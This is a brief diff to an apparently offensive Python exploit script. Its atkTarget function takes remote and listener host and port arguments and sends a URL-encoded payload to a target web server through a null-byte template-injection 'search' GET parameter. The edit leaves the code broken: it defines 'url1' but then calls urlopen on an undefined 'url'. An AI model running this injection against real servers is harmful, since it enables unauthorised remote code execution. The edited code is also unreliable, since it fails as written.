@@ -233,8 +233,9 @@ def atkTarget(rhost,rport,lhost,lport):
     # Encode the payload and send a HTTP GET request
     payload_encode = urllib.parse.quote_plus(payload)
     
-    url = 'http://{0}:{1}/?search=%00{{.'.format(rhost,rport) + payload_encode + '.}}'
-    urllib.request.urlopen(url)
+    url1 = f'http://{rhost}:{rport}/?search=%00'
+    url2 = '{{.' + payload_encode + '.}}'
+    urllib.request.urlopen(url + url2)
     print("\n[+] Sending encoded payload via GET request to target")
 
     # Print some information
